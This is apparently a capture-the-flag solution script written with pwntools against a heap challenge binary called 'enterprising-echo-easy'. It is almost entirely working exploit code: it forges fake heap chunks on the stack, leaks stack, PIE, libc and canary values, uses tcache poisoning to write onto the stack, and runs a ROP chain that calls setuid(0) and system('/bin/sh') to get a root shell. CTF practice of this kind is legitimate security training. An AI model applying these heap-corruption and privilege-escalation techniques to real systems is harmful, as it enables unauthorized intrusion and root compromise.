#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/enterprising-echo-easy', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001D02
            brva 0x0000000000001E1B
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

PROMPT = b"(malloc/free/echo/scanf/stack_free/stack_scanf/quit): "

def sla(aft, data):
    p.sendlineafter(aft, data)

def _malloc(idx, size):
    sla(PROMPT, b"malloc")
    sla(b"Index: ", str(idx).encode())
    sla(b"Size: ", str(size).encode())

def _free(idx):
    sla(PROMPT, b"free")
    sla(b"Index: ", str(idx).encode())

def _echo(idx, offset):
    sla(PROMPT, b"echo")
    sla(b"Index: ", str(idx).encode())
    sla(b"Offset: ", str(offset).encode())

def _scanf(idx, data):
    sla(PROMPT, b"scanf")
    sla(b"Index: ", str(idx).encode())
    p.sendline(data)

def _stack_free():
    sla(PROMPT, b"stack_free")

def _stack_scanf(data):
    sla(PROMPT, b"stack_scanf")
    p.sendline(data)

# Stage 1: Leak stack

fake_chunk = flat(
    b"A"*0x30,
    0,
    0x91
)
_stack_scanf(fake_chunk)

_stack_free()
p.recvuntil(b"free(")
stack_leak = int(p.recvuntil(")", drop = True), 16)
saved_rip = stack_leak + 0x58
log.info("saved_rip: " + hex(saved_rip))

# Stage 2: Leak PIE
#GDB()
_malloc(0, 0x80)
_echo(0, 0x78)
p.recvuntil(b"Data: ")
PIE = u64(p.recv(6) + b'\0'*2) - 0x1bc2
log.info("PIE_base: " + hex(PIE))
_echo(0, 0x58)
p.recvuntil(b"Data: ")
leak = u64(p.recv(6) + b'\0'*2) - 0x24083
libc.address = leak
log.info("libc_base: " + hex(libc.address))

# Stage 3: Leak Canary

_echo(0, 0x48+1)
p.recvuntil(b"Data: ")
canary = u64(b'\0' + p.recv(7)) 
log.info("canary: " + hex(canary))

# Stage 4: Tcache Poisoning overwrite RIP -> win

fake_chunk = flat(
    b'A'*0x60,
    0,
    0x51
    )
_stack_scanf(fake_chunk)
_malloc(1, 0x40)
_malloc(2, 0x40)
p.recvuntil(b"allocations[2] = malloc(64)")
p.recvuntil(b"allocations[2] = ")
heap_key = int(p.recvline()[:-1], 16)

_free(1)
_free(2)
stack_target = saved_rip-0x28
_scanf(2, p64(stack_target))
# GDB()
_malloc(3, 0x40)
_malloc(4, 0x40)

win = PIE + elf.sym.win
ret = PIE + 0x101a
pop_rdi = PIE + 0x22f3

pl = flat(
    b"A" * 0x18,
    canary,
    b"B" * 8,
    pop_rdi, 0,
    libc.sym.setuid,
    pop_rdi,
    next(libc.search(b"/bin/sh\0")),
    libc.sym.system
)

_scanf(4, pl)
sla(PROMPT, b"quit")

p.interactive()
